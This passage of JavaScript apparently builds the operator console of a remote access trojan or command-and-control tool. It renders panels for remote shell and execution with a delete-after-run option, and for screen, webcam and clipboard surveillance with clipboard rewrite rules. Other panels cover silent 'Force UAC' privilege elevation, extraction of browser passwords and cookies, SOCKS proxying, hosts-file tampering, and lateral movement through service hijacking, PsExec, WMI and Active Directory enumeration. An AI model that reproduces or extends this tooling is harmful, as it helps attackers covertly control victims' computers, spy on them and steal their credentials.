          <div class="info-label">Machine Name:</div>
          <div class="info-value">${client.machine}</div>
          <div class="info-label">Username:</div>
          <div class="info-value">${client.user}</div>
          <div class="info-label">Operating System:</div>
          <div class="info-value">${client.os}</div>
          <div class="info-label">Architecture:</div>
          <div class="info-value">${client.arch}</div>
          <div class="info-label">Account Type:</div>
          <div class="info-value">${client.account}</div>
          <div class="info-label">System Uptime:</div>
          <div class="info-value">${client.uptime}</div>
          <div class="info-label">Build ID:</div>
          <div class="info-value">${client.build}</div>
          <div class="info-label">Status:</div>
          <div class="info-value">${client.status}</div>
          <div class="info-label">Connected:</div>
          <div class="info-value">${fmt(Date.now()-client.connected)} ago</div>
        </div>
        <div class="info-section-title" style="margin-top:16px;margin-bottom:8px;font-weight:600;color:#aaa;">Hardware Information</div>
        <div class="info-grid">
          <div class="info-label">CPU:</div>
          <div class="info-value">${client.cpu_name || 'Unknown'}</div>
          <div class="info-label">CPU Cores:</div>
          <div class="info-value">${client.cpu_cores || 'Unknown'}</div>
          <div class="info-label">GPU:</div>
          <div class="info-value">${client.gpu_name || 'Unknown'}</div>
          <div class="info-label">VRAM:</div>
          <div class="info-value">${client.gpu_vram ? formatBytes(client.gpu_vram) : 'Unknown'}</div>
          <div class="info-label">Total RAM:</div>
          <div class="info-value">${client.ram_total ? formatBytes(client.ram_total) : 'Unknown'}</div>
          <div class="info-label">Motherboard:</div>
          <div class="info-value">${client.motherboard || 'Unknown'}</div>
        </div>
        <div class="info-section-title" style="margin-top:16px;margin-bottom:8px;font-weight:600;color:#aaa;">Storage Drives</div>
        <div class="drives-list">
          ${client.drives && client.drives.length > 0 ? client.drives.map(d => `
            <div class="drive-item" style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.1);">
              <span style="color:#fff;">${d.name}</span>
              <span style="color:#888;">${formatBytes(d.free_bytes)} free / ${formatBytes(d.total_bytes)} (${d.fs_type})</span>
            </div>
          `).join('') : '<div style="color:#666;">No drives detected</div>'}
        </div>
      `;

    // Administration - Remote Shell
    case 'remote-shell':
      return `
        <div class="shell-container" id="shell-output" style="height:300px;background:rgba(0,0,0,.4);border-radius:6px;padding:12px;font-family:monospace;font-size:12px;overflow-y:auto;margin-bottom:12px;color:#0f0;">
          <div style="color:#888;">Connecting to ${client.machine}...</div>
        </div>
        <div style="display:flex;gap:8px;">
          <input type="text" class="popup-input" id="shell-input" placeholder="Enter command..." style="flex:1;margin:0;">
          <button class="popup-btn" id="shell-send" style="margin:0;">Send</button>
        </div>
      `;

    // Administration - Remote Execute (upload & run or download & run)
    case 'remote-execute':
      return `
        <div style="display:flex;gap:16px;margin-bottom:12px;">
          <label class="radio">
            <input type="radio" name="exe-source" value="file" checked>
            <span class="radio-dot"></span>
            <span>Local File</span>
          </label>
          <label class="radio">
            <input type="radio" name="exe-source" value="url">
            <span class="radio-dot"></span>
            <span>URL</span>
          </label>
        </div>
        <div id="exe-file-section">
          <div style="display:flex;gap:4px;margin-bottom:8px;">
            <input type="text" class="popup-input" id="exe-path" placeholder="Select file to upload..." style="margin:0;flex:1;" readonly>
            <button class="fm-btn" id="exe-browse">...</button>
          </div>
          <input type="file" id="exe-file" style="display:none;">
        </div>
        <div id="exe-url-section" style="display:none;">
          <input type="text" class="popup-input" id="exe-url" placeholder="https://example.com/file.exe" style="margin-bottom:8px;">
        </div>
        <input type="text" class="popup-input" id="exe-args" placeholder="Arguments (optional)">
        <div style="display:flex;gap:16px;margin:12px 0;">
          <label class="radio">
            <input type="radio" name="exe-mode" value="child" checked>
            <span class="radio-dot"></span>
            <span>Child Process</span>
          </label>
          <label class="radio">
            <input type="radio" name="exe-mode" value="independent">
            <span class="radio-dot"></span>
            <span>Independent</span>
          </label>
        </div>
        <label class="checkbox">
          <input type="checkbox" id="exe-delete-after">
          <div class="check"></div>
          <span>Delete after run</span>
        </label>
        <button class="popup-btn" id="execute-btn">Execute</button>
      `;

    // Surveillance - Screenshot
    case 'screenshot':
      return `
        <div style="display:flex;justify-content:space-between;margin-bottom:8px;">
          <div class="screenshot-icon-btn" id="expand-screenshot" title="Expand" style="opacity:0.4;pointer-events:none;">&#x26F6;</div>
          <div style="display:flex;gap:8px;">
            <div class="screenshot-icon-btn" id="take-screenshot" title="Refresh">&#x21bb;</div>
            <div class="screenshot-icon-btn" id="save-screenshot" title="Save" style="opacity:0.4;pointer-events:none;">&#x2913;</div>
          </div>
        </div>
        <div class="screenshot-container" id="screenshot-view" style="min-height:200px;background:rgba(0,0,0,.3);border-radius:6px;display:flex;align-items:center;justify-content:center;">
          <span style="color:#888;">Capturing...</span>
        </div>
      `;

    // Surveillance - Remote Desktop
    case 'remote-desktop':
      return `
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
          <div style="display:flex;gap:8px;align-items:center;">
            <div class="select-wrapper" id="rd-mode-wrapper" style="width:90px;">
              <div class="custom-select" id="rd-mode" data-value="h264" style="white-space:nowrap;">H.264</div>
              <div class="custom-options" id="rd-mode-options">
                <div class="custom-option selected" data-value="h264">H.264</div>
                <div class="custom-option" data-value="jpeg">JPEG</div>
              </div>
            </div>
            <div class="select-wrapper" id="rd-quality-wrapper" style="width:110px;">
              <div class="custom-select" id="rd-quality" data-value="4" style="white-space:nowrap;">4 Mbps</div>
              <div class="custom-options" id="rd-quality-options">
                <div class="custom-option" data-value="8">8 Mbps</div>
                <div class="custom-option" data-value="6">6 Mbps</div>
                <div class="custom-option selected" data-value="4">4 Mbps</div>
                <div class="custom-option" data-value="2">2 Mbps</div>
                <div class="custom-option" data-value="1">1 Mbps</div>
              </div>
            </div>
          </div>
          <div style="display:flex;gap:4px;align-items:center;">
            <div class="screenshot-icon-btn" id="rd-start" title="Start">&#x25B6;</div>
            <div class="screenshot-icon-btn" id="rd-stop" title="Stop" style="opacity:0.4;pointer-events:none;">&#x25A0;</div>
            <div class="screenshot-icon-btn" id="rd-fullscreen" title="Fullscreen">&#x26F6;</div>
          </div>
        </div>
        <div id="rd-canvas-container" style="min-height:400px;background:rgba(0,0,0,.5);border-radius:6px;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;cursor:crosshair;">
          <span id="rd-placeholder" style="color:#888;">Click Start to begin</span>
          <canvas id="rd-canvas" style="display:none;max-width:100%;max-height:100%;"></canvas>
        </div>
        <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px;">
          <div id="rd-status" style="font-size:11px;color:#666;">Ready</div>
          <div style="display:flex;gap:4px;">
            <button class="rd-special-btn" data-key="ctrl_alt_del" title="Ctrl+Alt+Delete">CAD</button>
            <button class="rd-special-btn" data-key="alt_tab" title="Alt+Tab">&#x21C6;</button>
            <button class="rd-special-btn" data-key="win" title="Windows Key">&#x229E;</button>
            <button class="rd-special-btn" data-key="alt_f4" title="Alt+F4">&#x2715;</button>
            <button class="rd-special-btn" data-key="ctrl_esc" title="Ctrl+Esc">Esc</button>
          </div>
        </div>
      `;

    // Surveillance - Webcam
    case 'webcam':
      return `
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
          <div style="display:flex;gap:8px;align-items:center;">
            <div class="select-wrapper" id="webcam-video-wrapper" style="width:150px;">
              <div class="custom-select" id="webcam-video-device" data-value="" style="white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">Loading...</div>
              <div class="custom-options" id="webcam-video-options"></div>
            </div>
            <div class="select-wrapper" id="webcam-audio-wrapper" style="width:130px;">
              <div class="custom-select" id="webcam-audio-device" data-value="" style="white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">None</div>
              <div class="custom-options" id="webcam-audio-options">
                <div class="custom-option selected" data-value="">None</div>
              </div>
            </div>
          </div>
          <div style="display:flex;gap:4px;align-items:center;">
            <div class="screenshot-icon-btn" id="webcam-start" title="Start Stream">&#x25B6;</div>
            <div class="screenshot-icon-btn" id="webcam-stop" title="Stop Stream" style="opacity:0.4;pointer-events:none;">&#x25A0;</div>
            <div class="screenshot-icon-btn" id="webcam-fullscreen" title="Fullscreen">&#x26F6;</div>
          </div>
        </div>
        <div id="webcam-view" style="min-height:280px;background:rgba(0,0,0,.3);border-radius:6px;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;">
          <span style="color:#888;">No stream</span>
        </div>
        <div id="webcam-status" style="font-size:11px;color:#666;margin-top:8px;text-align:center;">Ready</div>
      `;

    // Surveillance - Clipboard
    case 'clipboard':
      return `
        <div class="cb-tabs" style="display:flex;gap:4px;margin-bottom:12px;border-bottom:1px solid rgba(255,255,255,.1);padding-bottom:8px;">
          <button class="cb-tab active" data-tab="current">Current</button>
          <button class="cb-tab" data-tab="history">History</button>
          <button class="cb-tab" data-tab="rules">Rules</button>
        </div>
        <div class="cb-panel" id="cb-current" style="display:block;">
          <div class="cb-current-content" style="min-height:120px;max-height:200px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;padding:12px;margin-bottom:12px;font-family:monospace;font-size:12px;color:#d0d0d0;white-space:pre-wrap;word-break:break-all;">
            <span style="color:#888;">Loading...</span>
          </div>
          <div style="display:flex;gap:8px;align-items:center;">
            <button class="popup-btn" id="refresh-clipboard" style="flex:1;">Refresh</button>
            <button class="popup-btn" id="set-clipboard" style="flex:1;">Set Clipboard</button>
            <label style="display:flex;align-items:center;gap:4px;cursor:pointer;white-space:nowrap;">
              <input type="checkbox" id="cb-auto-refresh" checked style="margin:0;">
              <span style="color:#888;font-size:11px;">Auto (2s)</span>
            </label>
          </div>
        </div>
        <div class="cb-panel" id="cb-history" style="display:none;">
          <div class="cb-history-list" style="min-height:120px;max-height:250px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;margin-bottom:12px;">
            <div style="padding:12px;color:#888;text-align:center;">Loading...</div>
          </div>
          <button class="popup-btn" id="clear-history" style="width:100%;">Clear History</button>
        </div>
        <div class="cb-panel" id="cb-rules" style="display:none;">
          <div class="cb-rules-list" style="min-height:80px;max-height:150px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;margin-bottom:12px;">
            <div style="padding:12px;color:#888;text-align:center;">No rules</div>
          </div>
          <div style="display:flex;flex-direction:column;gap:8px;">
            <input type="text" class="popup-input" id="rule-pattern" placeholder="Regex pattern (e.g. [a-z]+@[a-z]+\\.com)" style="font-family:monospace;">
            <input type="text" class="popup-input" id="rule-replacement" placeholder="Replacement text">
            <button class="popup-btn" id="add-rule">Add Rule</button>
          </div>
        </div>
      `;

    // User Interaction - Messagebox
    case 'messagebox':
      return `
        <input type="text" class="popup-input" id="msg-title" placeholder="Message Title">
        <textarea class="popup-input" id="msg-text" placeholder="Message content..." style="min-height:80px;resize:vertical;"></textarea>
        <div class="form-group" style="margin-bottom:12px;">
          <label style="display:block;margin-bottom:8px;color:#aaa;font-size:11px;">Icon Type</label>
          <div class="radio-group">
            <label class="radio">
              <input type="radio" name="msg-icon" value="info" checked>
              <span class="radio-dot"></span>
              <span>Info</span>
            </label>
            <label class="radio">
              <input type="radio" name="msg-icon" value="warning">
              <span class="radio-dot"></span>
              <span>Warning</span>
            </label>
            <label class="radio">
              <input type="radio" name="msg-icon" value="error">
              <span class="radio-dot"></span>
              <span>Error</span>
            </label>
          </div>
        </div>
        <button class="popup-btn" id="send-msgbox">Show Message</button>
      `;

    // User Interaction - Open URL
    case 'open-url':
      return `
        <input type="text" class="popup-input" id="url-input" placeholder="https://example.com">
        <label class="checkbox">
          <input type="checkbox" id="hidden-browser">
          <div class="check"></div>
          <span>Hide launch console</span>
        </label>
        <button class="popup-btn" id="open-url-btn">Open URL</button>
      `;

    // Client Control - Confirmation dialogs
    case 'disconnect':
    case 'uninstall':
    case 'restart-client':
    case 'reconnect':
    case 'reboot':
    case 'shutdown':
    case 'lock':
    case 'logoff':
      const actionNames = {
        'disconnect': 'disconnect',
        'uninstall': 'uninstall the client from',
        'restart-client': 'restart the client on',
        'reconnect': 'force reconnect on',
        'reboot': 'reboot',
        'shutdown': 'shutdown',
        'lock': 'lock',
        'logoff': 'log off the user on'
      };
      return `
        <p style="color:#d0d0d0;margin-bottom:16px;">Are you sure you want to ${actionNames[action]} <strong>${client.machine}</strong>?</p>
        <div style="display:flex;gap:8px;">
          <button class="popup-btn" id="confirm-action" style="flex:1;">Confirm</button>
          <button class="popup-btn" id="cancel-action" style="flex:1;background:rgba(255,255,255,.1);border-color:rgba(255,255,255,.2);color:#888;">Cancel</button>
        </div>
      `;

    // Client Control - Update/Elevate
    case 'elevate':
      return `
        <p style="color:#d0d0d0;margin-bottom:16px;">Request UAC elevation on <strong>${client.machine}</strong>?</p>
        <p style="color:#888;font-size:11px;margin-bottom:16px;">This will display a standard UAC prompt on the client machine. The user must click "Yes" to grant administrator privileges.</p>
        <button class="popup-btn" id="elevate-btn">Request UAC</button>
      `;

    case 'force-elevate':
      return `
        <p style="color:#d0d0d0;margin-bottom:16px;">Force UAC elevation on <strong>${client.machine}</strong>?</p>
        <p style="color:#888;font-size:11px;margin-bottom:16px;">This will silently elevate the client to administrator privileges without user interaction. Useful when the user is AFK or standard UAC prompts are problematic.</p>
        <button class="popup-btn" id="force-elevate-btn">Force UAC</button>
      `;

    case 'update':
      return `
        <p style="color:#d0d0d0;margin-bottom:12px;">Update client on <strong>${client.machine}</strong></p>
        <input type="text" class="popup-input" id="update-url" placeholder="Update URL (leave empty for server default)">
        <button class="popup-btn" id="update-btn">Update Client</button>
      `;

    // Recovery - Credentials
    case 'credentials':
      return `
        <div id="creds-loading" style="text-align:center;padding:40px;">
          <div style="color:#888;">Extracting credentials...</div>
        </div>
        <div id="creds-results" style="display:none;">
          <div style="display:flex;gap:8px;margin-bottom:12px;">
            <button class="cb-tab active" data-tab="passwords" id="creds-tab-passwords">Passwords</button>
            <button class="cb-tab" data-tab="cookies" id="creds-tab-cookies">Cookies</button>
          </div>
          <div id="creds-passwords-panel">
            <div class="pm-search-container" style="margin-bottom:8px;">
              <input type="text" class="pm-search" id="creds-password-search" placeholder="Search passwords...">
            </div>
            <div id="creds-passwords-list" class="pm-table-container" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;"></div>
            <div style="margin-top:8px;display:flex;align-items:flex-start;">
              <span id="creds-password-count" style="color:#888;font-size:11px;"></span>
              <span id="creds-export-passwords" style="margin-left:auto;color:#888;font-size:11px;cursor:pointer;transition:color .15s ease;">⤓ Export CSV</span>
            </div>
          </div>
          <div id="creds-cookies-panel" style="display:none;">
            <div class="pm-search-container" style="margin-bottom:8px;">
              <input type="text" class="pm-search" id="creds-cookie-search" placeholder="Search cookies...">
            </div>
            <div id="creds-cookies-list" class="pm-table-container" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;"></div>
            <div style="margin-top:8px;display:flex;align-items:flex-start;">
              <span id="creds-cookie-count" style="color:#888;font-size:11px;"></span>
              <span id="creds-export-cookies" style="margin-left:auto;color:#888;font-size:11px;cursor:pointer;transition:color .15s ease;">⤓ Export CSV</span>
            </div>
          </div>
        </div>
        <div id="creds-error" style="display:none;text-align:center;padding:20px;">
          <div style="color:#ef4444;margin-bottom:8px;">Failed to extract credentials</div>
          <div id="creds-error-msg" style="color:#888;font-size:11px;"></div>
        </div>
      `;

    // Network - Reverse Proxy
    case 'reverse-proxy':
      return `
        <div class="proxy-tabs" style="display:flex;gap:4px;margin-bottom:12px;border-bottom:1px solid rgba(255,255,255,.1);padding-bottom:8px;">
          <button class="cb-tab active" data-proxy-tab="socks5">SOCKS5</button>
          <button class="cb-tab" data-proxy-tab="local-pipe">Local Pipe</button>
          <button class="cb-tab" data-proxy-tab="remote-pipe">Remote Pipe</button>
        </div>

        <!-- SOCKS5 Panel -->
        <div class="proxy-panel" id="proxy-socks5" style="display:block;">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
            <div style="color:#888;font-size:12px;">
              <span>Protocol: <span style="color:#aaa;">SOCKS5/TCP</span></span>
            </div>
            <div style="display:flex;gap:4px;align-items:center;">
              <div class="screenshot-icon-btn" id="proxy-start" title="Start Proxy">&#x25B6;</div>
              <div class="screenshot-icon-btn" id="proxy-stop" title="Stop Proxy" style="opacity:0.4;pointer-events:none;">&#x25A0;</div>
            </div>
          </div>
          <div id="proxy-status" style="font-size:12px;color:#888;margin-bottom:12px;padding-bottom:12px;border-bottom:1px solid rgba(255,255,255,.1);">
            <span id="proxy-status-text">Proxy not running</span>
            <span id="proxy-address" style="color:#64b4ff;display:none;cursor:pointer;" title="Click to copy"></span>
            <div id="proxy-copy-hint" style="display:none;color:#666;font-size:11px;margin-top:4px;">(click to copy)</div>
          </div>
          <div style="color:#666;font-size:11px;">Configure your browser or application to use SOCKS5 proxy at the address shown above.</div>
        </div>

        <!-- Local Pipe Panel -->
        <div class="proxy-panel" id="proxy-local-pipe" style="display:none;">
          <div style="margin-bottom:12px;">
            <div style="color:#888;font-size:11px;margin-bottom:8px;">Pipe Name (without \\\\.\\pipe\\ prefix)</div>
            <input type="text" class="popup-input" id="proxy-local-pipe-name" placeholder="e.g., sql/query or MSSQL$LOCALDB" style="margin:0;">
          </div>
          <div style="display:flex;gap:8px;margin-bottom:12px;">
            <button class="fm-btn" id="proxy-local-pipe-connect" style="flex:1;">Connect to Pipe</button>
          </div>
          <div id="proxy-local-pipe-status" style="font-size:11px;color:#888;"></div>
          <div style="margin-top:12px;padding:10px;background:rgba(100,180,255,.08);border-radius:6px;border:1px solid rgba(100,180,255,.15);">
            <div style="color:#888;font-size:10px;">Connect to a local named pipe on the remote machine (e.g., SQL LocalDB, service control pipes).</div>
          </div>
        </div>

        <!-- Remote Pipe Panel -->
        <div class="proxy-panel" id="proxy-remote-pipe" style="display:none;">
          <div style="display:flex;gap:8px;margin-bottom:12px;">
            <div style="flex:1;">
              <div style="color:#888;font-size:11px;margin-bottom:8px;">Server</div>
              <input type="text" class="popup-input" id="proxy-remote-server" placeholder="192.168.1.100 or hostname" style="margin:0;">
            </div>
            <div style="flex:1;">
              <div style="color:#888;font-size:11px;margin-bottom:8px;">Pipe Name</div>
              <input type="text" class="popup-input" id="proxy-remote-pipe-name" placeholder="e.g., sql/query" style="margin:0;">
            </div>
          </div>
          <div style="margin-bottom:8px;color:#888;font-size:11px;">
            <label style="display:flex;align-items:center;gap:6px;cursor:pointer;">
              <input type="checkbox" id="proxy-remote-use-creds" style="margin:0;">
              <span>Use alternate credentials</span>
            </label>
          </div>
          <div id="proxy-remote-creds-section" style="display:none;margin-bottom:12px;">
            <div style="display:flex;gap:8px;margin-bottom:8px;">
              <div style="flex:1;">
                <div style="color:#888;font-size:11px;margin-bottom:8px;">Domain (optional)</div>
                <input type="text" class="popup-input" id="proxy-remote-domain" placeholder="DOMAIN or leave empty" style="margin:0;">
              </div>
              <div style="flex:1;">
                <div style="color:#888;font-size:11px;margin-bottom:8px;">Username</div>
                <input type="text" class="popup-input" id="proxy-remote-user" placeholder="username" style="margin:0;">
              </div>
            </div>
            <div>
              <div style="color:#888;font-size:11px;margin-bottom:8px;">Password</div>
              <input type="password" class="popup-input" id="proxy-remote-pass" placeholder="password" style="margin:0;">
            </div>
          </div>
          <div style="display:flex;gap:8px;margin-bottom:12px;">
            <button class="fm-btn" id="proxy-remote-pipe-connect" style="flex:1;">Connect to Remote Pipe</button>
          </div>
          <div id="proxy-remote-pipe-status" style="font-size:11px;color:#888;"></div>
          <div style="margin-top:12px;padding:10px;background:rgba(255,200,0,.08);border-radius:6px;border:1px solid rgba(255,200,0,.15);">
            <div style="color:#888;font-size:10px;">Connect to a named pipe on a remote server via SMB. Use credentials if current context doesn't have access.</div>
          </div>
        </div>
      `;

    // Network - DNS Management
    case 'dns-management':
      return `
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
          <span style="color:#888;font-size:12px;">Hosts File Entries</span>
          <div style="display:flex;gap:4px;align-items:center;">
            <div class="screenshot-icon-btn" id="dns-refresh" title="Refresh">&#x21BB;</div>
            <div class="screenshot-icon-btn" id="dns-add" title="Add Entry">+</div>
          </div>
        </div>
        <div id="dns-list" style="min-height:150px;max-height:250px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;margin-bottom:12px;">
          <div style="padding:12px;color:#888;text-align:center;">Loading...</div>
        </div>
        <div id="dns-add-form" style="display:none;padding:12px;background:rgba(0,0,0,.2);border-radius:6px;margin-bottom:12px;">
          <div style="display:flex;gap:8px;margin-bottom:8px;">
            <input type="text" class="popup-input" id="dns-hostname" placeholder="Hostname (e.g., example.com)" style="flex:1;">
            <input type="text" class="popup-input" id="dns-ip" placeholder="IP (e.g., 127.0.0.1)" style="width:130px;">
          </div>
          <div style="display:flex;gap:8px;">
            <button class="popup-btn" id="dns-save" style="flex:1;">Add Entry</button>
            <button class="popup-btn" id="dns-cancel" style="flex:1;background:rgba(255,255,255,.05);">Cancel</button>
          </div>
        </div>
        <div id="dns-status" style="font-size:11px;color:#666;"></div>
      `;

    // Network - Lateral Movement
    case 'lateral-movement':
      return `
        <div class="lateral-tabs" style="display:flex;gap:4px;margin-bottom:12px;border-bottom:1px solid rgba(255,255,255,.1);padding-bottom:8px;flex-wrap:wrap;">
          <button class="cb-tab active" data-tab="tokens">Tokens</button>
          <button class="cb-tab" data-tab="jump">Jump</button>
          <button class="cb-tab" data-tab="pivots">Pivots</button>
          <button class="cb-tab" data-tab="execute">Remote Exec</button>
          <button class="cb-tab" data-tab="ad">AD</button>
          <button class="cb-tab" data-tab="kerberos">Kerberos</button>
          <button class="cb-tab" data-tab="security">Security</button>
        </div>

        <!-- Tokens Panel -->
        <div class="lateral-panel" id="lateral-tokens" style="display:block;">
          <div style="margin-bottom:12px;padding:10px;background:rgba(0,0,0,.2);border-radius:6px;">
            <div style="color:#888;font-size:11px;margin-bottom:8px;font-weight:bold;">Create Token</div>
            <div style="display:flex;gap:8px;margin-bottom:8px;">
              <div style="flex:1;">
                <input type="text" class="popup-input" id="token-domain" placeholder="DOMAIN" style="margin:0;padding:6px 10px;font-size:11px;">
              </div>
              <div style="flex:1;">
                <input type="text" class="popup-input" id="token-username" placeholder="username" style="margin:0;padding:6px 10px;font-size:11px;">
              </div>
              <div style="flex:1;">
                <input type="password" class="popup-input" id="token-password" placeholder="password" style="margin:0;padding:6px 10px;font-size:11px;">
              </div>
              <button class="fm-btn" id="token-make-btn" style="padding:6px 12px;">Make</button>
            </div>
          </div>
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
            <span style="color:#888;font-size:11px;">Active Tokens</span>
            <div style="display:flex;gap:4px;">
              <button class="fm-btn" id="token-revert-btn" style="padding:4px 8px;font-size:10px;">Revert to Self</button>
              <button class="fm-btn" id="token-refresh-btn" style="padding:4px 8px;font-size:10px;">Refresh</button>
            </div>
          </div>
          <div id="token-list" style="min-height:100px;max-height:180px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;padding:4px;">
            <div style="color:#666;font-size:11px;padding:20px;text-align:center;">No tokens created</div>
          </div>
          <div id="token-status" style="font-size:11px;margin-top:8px;"></div>
        </div>

        <!-- Jump Panel -->
        <div class="lateral-panel" id="lateral-jump" style="display:none;">
          <div style="display:flex;gap:8px;margin-bottom:12px;">
            <div style="flex:1;">
              <div style="color:#888;font-size:11px;margin-bottom:8px;">Target Host</div>
              <input type="text" class="popup-input" id="jump-host" placeholder="TALON-DC" style="margin:0;">
            </div>
            <div style="flex:1;">
              <div style="color:#888;font-size:11px;margin-bottom:8px;">Method</div>
              <div class="select-wrapper" data-name="jump-method" style="margin:0;">
                <div class="custom-select" data-value="scshell" style="padding:8px 12px;">SCShell</div>
                <div class="custom-options">
                  <div class="custom-option selected" data-value="scshell">SCShell (hijack service)</div>
                  <div class="custom-option" data-value="psexec">PsExec (new service)</div>
                  <div class="custom-option" data-value="winrm">WinRM (PowerShell)</div>
                </div>
              </div>
            </div>
          </div>
          <div id="jump-service-field" style="margin-bottom:12px;">
            <div style="color:#888;font-size:11px;margin-bottom:8px;">Service Name</div>
            <input type="text" class="popup-input" id="jump-service" placeholder="UevAgentService" style="margin:0;">
            <div style="font-size:10px;color:#666;margin-top:4px;">For SCShell: existing service to hijack. For PsExec: new service name.</div>
          </div>
          <div style="margin-bottom:12px;">
            <label style="display:flex;align-items:center;gap:8px;cursor:pointer;margin-bottom:8px;">
              <input type="checkbox" id="jump-deploy-self" checked style="width:14px;height:14px;">
              <span style="color:#64b4ff;font-size:11px;">Deploy current agent (recommended)</span>
            </label>
            <div id="jump-exe-field" style="display:none;">
              <div style="color:#888;font-size:11px;margin-bottom:8px;">Custom Executable Path</div>
              <input type="text" class="popup-input" id="jump-executable" placeholder="C:\\path\\to\\payload.exe" style="margin:0;">
              <div style="font-size:10px;color:#666;margin-top:4px;">Path on the agent machine to deploy</div>
            </div>
          </div>
          <button class="fm-btn" id="jump-exec-btn" style="width:100%;">Execute Jump</button>
          <div id="jump-output" style="min-height:100px;max-height:200px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;padding:8px;margin-top:12px;font-family:monospace;font-size:10px;color:#aaa;display:none;"></div>
          <div id="jump-status" style="font-size:11px;margin-top:8px;"></div>
        </div>

        <!-- Pivots Panel -->
        <div class="lateral-panel" id="lateral-pivots" style="display:none;">
          <div style="margin-bottom:12px;padding:10px;background:rgba(0,0,0,.2);border-radius:6px;">
            <div style="color:#888;font-size:11px;margin-bottom:8px;font-weight:bold;">Connect to SMB Pivot</div>
            <div style="display:flex;gap:8px;align-items:flex-end;">
              <div style="flex:1;">
                <div style="color:#666;font-size:10px;margin-bottom:4px;">Target Host</div>
                <input type="text" class="popup-input" id="pivot-host" placeholder="TALON-DC" style="margin:0;padding:6px 10px;font-size:11px;">
              </div>
              <div style="flex:1;">
                <div style="color:#666;font-size:10px;margin-bottom:4px;">Pipe Name</div>
                <input type="text" class="popup-input" id="pivot-pipe" placeholder="agent_pipe" style="margin:0;padding:6px 10px;font-size:11px;">
              </div>
              <button class="fm-btn" id="pivot-connect-btn" style="padding:6px 12px;">Connect</button>
            </div>
          </div>
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
            <span style="color:#888;font-size:11px;">Active Pivots</span>
            <button class="fm-btn" id="pivot-refresh-btn" style="padding:4px 8px;font-size:10px;">Refresh</button>
          </div>
          <div id="pivot-list" style="min-height:100px;max-height:180px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;padding:4px;">
            <div style="color:#666;font-size:11px;padding:20px;text-align:center;">No active pivots</div>
          </div>
          <div id="pivot-status" style="font-size:11px;margin-top:8px;"></div>
        </div>

        <!-- Remote Execute Panel (merged with credentials testing) -->
        <div class="lateral-panel" id="lateral-execute" style="display:none;">
          <div style="display:flex;gap:8px;margin-bottom:8px;">
            <div style="flex:1;">
              <div style="color:#888;font-size:11px;margin-bottom:4px;">Host</div>
              <input type="text" class="popup-input" id="lateral-exec-host" placeholder="192.168.1.100" style="margin:0;padding:6px 10px;">
            </div>
            <div style="flex:1;">
              <div style="color:#888;font-size:11px;margin-bottom:4px;">User</div>
              <input type="text" class="popup-input" id="lateral-exec-user" placeholder="DOMAIN\\user" style="margin:0;padding:6px 10px;">
            </div>
            <div style="flex:1;">
              <div style="color:#888;font-size:11px;margin-bottom:4px;">Pass</div>
              <input type="password" class="popup-input" id="lateral-exec-pass" placeholder="****" style="margin:0;padding:6px 10px;">
            </div>
          </div>
          <div style="display:flex;gap:8px;margin-bottom:8px;align-items:center;justify-content:space-between;">
            <div style="display:flex;gap:8px;">
              <label class="radio">
                <input type="radio" name="lateral-exec-method" value="wmi" checked>
                <span class="radio-dot"></span>
                <span>WMI</span>
              </label>
              <label class="radio">
                <input type="radio" name="lateral-exec-method" value="winrm">
                <span class="radio-dot"></span>
                <span>WinRM</span>
              </label>
              <label class="radio">
                <input type="radio" name="lateral-exec-method" value="smb">
                <span class="radio-dot"></span>
                <span>SMB</span>
              </label>
            </div>
            <button class="fm-btn" id="lateral-test-creds" style="padding:4px 10px;font-size:10px;">Test Creds</button>
          </div>
          <div style="display:flex;gap:8px;align-items:center;">
            <input type="text" class="popup-input" id="lateral-exec-cmd" placeholder="cmd.exe /c whoami" style="flex:1;margin:0;padding:6px 12px;">
            <button class="fm-btn" id="lateral-exec-btn">Run</button>
          </div>
          <div id="lateral-exec-output" style="min-height:60px;max-height:120px;overflow-y:auto;background:rgba(0,0,0,.3);border-radius:6px;padding:8px;margin-top:8px;font-family:monospace;font-size:10px;color:#aaa;display:none;"></div>
          <div id="lateral-exec-status" style="font-size:11px;margin-top:8px;"></div>
        </div>

        <!-- Active Directory Panel -->
        <div class="lateral-panel" id="lateral-ad" style="display:none;">
          <div style="margin-bottom:12px;padding:10px;background:rgba(0,0,0,.2);border-radius:6px;">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
              <span style="color:#888;font-size:11px;font-weight:bold;">Domain Information</span>
              <button class="fm-btn" id="ad-get-domain-btn" style="padding:4px 10px;font-size:10px;">Get Info</button>
            </div>
            <div id="ad-domain-info" style="font-size:11px;color:#aaa;">
              <span style="color:#666;">Click "Get Info" to query domain</span>
            </div>
          </div>
          <div style="display:flex;gap:8px;margin-bottom:8px;">
            <div class="select-wrapper" data-name="ad-enum-type" style="flex:1;">
              <div class="custom-select" data-value="users" style="padding:6px 10px;font-size:11px;">Users</div>
              <div class="custom-options">
                <div class="custom-option selected" data-value="users">Users</div>
                <div class="custom-option" data-value="groups">Groups</div>
                <div class="custom-option" data-value="computers">Computers</div>
                <div class="custom-option" data-value="spns">SPNs (Service Accounts)</div>
                <div class="custom-option" data-value="sessions">Sessions</div>
                <div class="custom-option" data-value="trusts">Domain Trusts</div>
              </div>
            </div>
